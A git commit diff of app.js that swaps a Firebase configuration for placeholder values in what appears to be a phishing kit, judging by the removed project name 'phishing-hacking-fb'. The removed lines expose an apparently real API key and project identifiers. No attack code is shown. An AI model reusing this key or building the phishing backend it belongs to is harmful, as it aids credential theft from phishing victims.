bea74e09bed65586951250be641e59023a896531
Prateek Chaubey <41151614+prateek-chaubey@users.noreply.github.com>
2020-06-25 14:03:22 +0530

    Add files via upload

--- app.js
+++ app.js
@@ -1,23 +1,22 @@
-
-
-
-
-
-
-
-
-
-
 // Initialize Firebase
-var config = {
-  
-  apiKey: "AIzaSyBH-COyn6B5IbLoFpWO8g_IuMxy_21Apco",
-  authDomain: "phishing-hacking-fb.firebaseapp.com",
-  databaseURL: "https://phishing-hacking-fb.firebaseio.com",
-  projectId: "phishing-hacking-fb",
-  storageBucket: "", 
-  messagingSenderId: "517913620350",
-  appId: "1:517913620350:web:c8501c9c70abe1c2"
-     };
-firebase.initializeApp(config);
+
+
+///Edit Under This
+
+var firebaseConfig = {
+  apiKey: "api-key",
+  authDomain: "project-id.firebaseapp.com",
+  databaseURL: "https://project-id.firebaseio.com",
+  projectId: "project-id",
+  storageBucket: "project-id.appspot.com",
+  messagingSenderId: "sender-id",
+  appId: "app-id",
+  measurementId: "G-measurement-id",
+};
+
+     
+ 
+////Do Not Edit Below This
+
+//firebase.initializeApp(config);
 var database = firebase.database();
